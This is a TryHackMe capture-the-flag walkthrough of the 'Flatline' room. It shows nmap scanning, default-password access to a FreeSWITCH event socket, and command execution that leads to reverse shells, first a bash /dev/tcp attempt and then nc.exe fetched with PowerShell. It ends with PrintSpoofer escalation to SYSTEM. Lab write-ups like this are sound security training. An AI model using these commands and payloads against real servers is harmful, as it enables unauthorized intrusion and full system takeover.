# Try Hack Me - Flatline
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities: default credentials, rce, SeImpersonatePrivilege abuse, insecure file permissions

# Reconnaisance:

nmap scan:
```bash
nmap -sC -sV <target_ip>
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 16:53 IST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.58 seconds

this does not look good, let us use the -Pn flag to skip the host discovery step and check out for the open ports

```bash
nmap -Pn <target_ip>
```
PORT     STATE SERVICE

3389/tcp open  ms-wbt-server

8021/tcp open  ftp-proxy

alright so we have two ports open, lets use the -sV and -sC flags to check out what version these services are running

```bash
nmap -sC -sV -p 3389,8021 <target_ip> -Pn
```
note: you can only access these services using the -Pn flag!

PORT	STATE	SERVICE	VERSION
3389/tcp	open	ms-wbt-server	Microsoft Terminal Services
8021/tcp	open	freeswitch-event	FreeSWITCH mod_event_socket
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

after doing some research using deepseek i found out that the port 8021 is out primary attack vector for getting initial access.

it is a management interface with command execution capabilities.

lets try some defualt credentials 

```bash 
echo -e "auth ClueFS\n\n" | nc -nv <target_ip> 8021
```
(UNKNOWN) [10.80.185.176] 8021 (zope-ftp) open
Content-Type: auth/request

Content-Type: command/reply
Reply-Text: -ERR invalid

Content-Type: text/disconnect-notice
Content-Length: 67

Disconnected, goodbye.
See you at ClueCon! http://www.cluecon.com/

okay even if we got disconnected, it is still great news since we are getting some response from the client
the message "see you at ClueCon" could be a hint! lets use ClueCon as the password instead of ClueFS

```bash
echo -e "auth ClueCon\n\n" | nc -nv <target_ip> 8021
```
(UNKNOWN) [10.80.185.176] 8021 (zope-ftp) open
Content-Type: auth/request

Content-Type: command/reply
Reply-Text: +OK accepted

bingo! we found the password. now lets tweak around in order to see whether we can execute some commands in this interface

```bash
cat << EOF | nc -nv <target_ip> 8021
auth ClueCon

api system whoami

EOF

```
(UNKNOWN) [10.80.185.176] 8021 (zope-ftp) open
Content-Type: auth/request

Content-Type: command/reply
Reply-Text: +OK accepted

Content-Type: api/response
Content-Length: 25

win-eom4pk0578n\nekrotic

we got a hit! command execution can be carried out. lets start a listener at port 4444 in a terminal and send a reverse shell payload to the interface

```bash
nc -lnvp 4444
```

now we send the reverse shell payload in bash

cat << EOF | nc -nv <target_ip> 8021
auth ClueCon

api system bash -c 'bash -i >& /dev/tcp/192.168.168.245/4444 0>&1'

EOF

turns out we forgot that it is a windows server from 2019 in the rdp info at port 3389 so /dev/tcp reverse hell wont work, we need to craft a different payload for the reverse shell using a python listener and a powershell reverse shell

first make sure the netcat executable file nc.exe is avalaible in your current directory by running the command:

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
```

now setup a python listener
```bash 
python3 -m http.server 8000
```

no we craft the payload:

```bash
cat << 'EOF' | nc -nv 10.80.185.176 8021
auth ClueCon

api system powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.168.245:8000/nc.exe', 'C:\\Windows\\Temp\\nc.exe')"
```

once you get the reponse as a 200 status code on your python listener, start a netcat listner on another terminal

10.80.139.100 - - [02/Jan/2026 17:45:57] "GET /nc.exe HTTP/1.1" 200 

```bash
nc -lnvp 4444
```
now stop the python listener using ctrl+c in your terminal and put this payload instead

```bash
cat << EOF | nc -nv <target_ip> 8021
auth ClueCon

api system C:\\Windows\\Temp\\nc.exe -e cmd.exe <attacker_ip> 4444

EOF
```
and we get a shell access! 

nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.168.245] from (UNKNOWN) [10.80.139.100] 49786
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\FreeSWITCH>

# Finding the flags:

since this is not a regular linux system dir command will replace ls command. lets find the flag locations

C:\Users\Nekrotic\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 84FD-2CC9

 Directory of C:\Users\Nekrotic\Desktop

09/11/2021  07:39    <DIR>          .
09/11/2021  07:39    <DIR>          ..
09/11/2021  07:39                38 root.txt
09/11/2021  07:39                38 user.txt
               2 File(s)             76 bytes
               2 Dir(s)  50,004,832,256 bytes free

we found the flags!

>type user.txt

lets see if we can access the root.txt flag. thought so, access is denied to the root.txt flag. so we have to escalate our privileges as administrator
first lets transfer winpeas from our machine to the windows shell 

```bash
cd /usr/share/peass/winpeas
```
next we start a python listener to transfer the .exe file over

```bash
python3 -m http.server 8080
```

now on our shell we have to use powershell command to get that exact winpeas executable file on our system

```bash
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<target_ip>:8080/winPEASx64.exe', 'C:\Windows\Temp\winpeas.exe')"
```


now we simply traverse to the directory where the winpeas is stored and execute it there

```bash
cd C:\Windows\Temp
.\winpeas.exe
```

after running the winpeas and analyzing it using aI, we find out that we are already in the administrator group, lets use powershell to find out the permissions of the root.txt file since it is forbidden to use the normal way of finding the permissions to that file

```bash
powershell -c "Get-Acl 'C:\Users\Nekrotic\Desktop\root.txt' | Format-List"
```

we get the output as 
Path   : Microsoft.PowerShell.Core\FileSystem::C:\Users\Nekrotic\Desktop\root.txt
Owner  : NT AUTHORITY\SYSTEM
Group  : WIN-EOM4PK0578N\None
Access : NT AUTHORITY\SYSTEM Allow  FullControl
Audit  : 
Sddl   : O:SYG:S-1-5-21-343416598-1122472384-1008025730-513D:PAI(A;;FA;;;SY)

this means the root.txt file is entirely owned by the NT AUTHORITY\SYSTEM
and it has FullControl

# Privilege Escalation:

lets download this tool named PrintSpoofer on our kali machine

```bash
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe
```
now lets start a python listner in the same directory where you downloaded the PrintSpoofer

```bash
python3 -m http.server 8080
```

after that ussing this simple powershell command to transfer the files

```bash
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<attacker_ip>:8080/PrintSpoofer.exe', 'C:\Windows\Temp\ps.exe')"
```
now we go to the location of the ps.exe i.e C:\Windows\Temp

and we try to get an interactive shell

```bash
ps.exe -i -c cmd
```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

boom! we have a shell as nt authority\system, lets read the root.txt and submit the root flag

```bash
type C:\Users\Nekrotic\Desktop\root.txt
```

we are now able to read the root.txt flag and we finally submit it!
                                                                   
